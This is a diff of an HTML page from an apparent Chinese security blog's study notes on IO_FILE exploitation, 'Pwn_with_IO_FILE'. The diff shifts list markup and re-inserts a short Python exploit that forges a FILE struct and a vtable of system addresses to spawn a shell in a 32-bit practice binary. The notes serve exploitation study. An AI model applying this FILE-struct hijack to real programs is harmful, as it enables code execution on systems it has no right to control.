@@ -50,7 +50,7 @@
 <link rel="shortcut icon" href="../../../../images/favicon.png">
 
 
-<title>pwn_with_io_file - Watch Security</title>
+<title>Watch Security</title>
 
 <meta name="keywords" content="pwn io file">
 
@@ -175,9 +175,9 @@
                 </p>
                 <p></p>
             </div>
-            <h2 class="post-title">Pwn_with_IO_FILE</h2>
+            <h2 class="post-title"></h2>
             <div class="post-meta">
-                本文总共9758个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共9756个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -341,18 +341,16 @@
 <li>设置_flags &amp; 0x2000 = 0</li>
 </ul>
 </li>
-<li><p>设置read_ptr为”;sh”</p>
-<ul>
-<li>伪造vtable，设置flush字段为system</li>
+<li>设置read_ptr为”;sh”</li>
+</ul>
+</li>
+<li><p>伪造vtable，设置flush字段为system</p>
+</li>
 </ul>
 </li>
 <li><p>exp记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fd_addr = <span class="number">0x0804B280</span></span><br><span class="line">  fake_file_addr = <span class="number">0x0804B300</span></span><br><span class="line">  </span><br><span class="line">  name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">  name += p32(fake_file_addr)		<span class="comment">#*fd = fake_file_addr</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#padding</span></span><br><span class="line">  fake_file = <span class="string">"\x00"</span> * (fake_file_addr - fd_addr <span class="number">-4</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#file struct</span></span><br><span class="line">  fake_file += ((p32(<span class="number">0xffffdfff</span>) + <span class="string">";sh"</span>).ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake vtable_addr</span></span><br><span class="line">  fake_file += p32(fake_file_addr + <span class="number">0x98</span>)	</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake_vtables		</span></span><br><span class="line">  fake_file += p32(system_addr)*<span class="number">21</span></span><br><span class="line">  exit(name + fake_file)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
+<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fd_addr = <span class="number">0x0804B280</span></span><br><span class="line">  fake_file_addr = <span class="number">0x0804B300</span></span><br><span class="line">  </span><br><span class="line">  name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">  name += p32(fake_file_addr)		<span class="comment">#*fd = fake_file_addr</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#padding</span></span><br><span class="line">  fake_file = <span class="string">"\x00"</span> * (fake_file_addr - fd_addr <span class="number">-4</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#file struct</span></span><br><span class="line">  fake_file += ((p32(<span class="number">0xffffdfff</span>) + <span class="string">";sh"</span>).ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>))</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake vtable_addr</span></span><br><span class="line">  fake_file += p32(fake_file_addr + <span class="number">0x98</span>)	</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#fake_vtables		</span></span><br><span class="line">  fake_file += p32(system_addr)*<span class="number">21</span></span><br><span class="line">  exit(name + fake_file)</span><br></pre></td></tr></table></figure>
+</code></pre></li>
 </ul>
 <h4 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h4><ul>
 <li><a href="https://www.jianshu.com/p/a6354fa4dbdf" target="_blank" rel="noopener">IO_FILE通用利用模板</a></li>
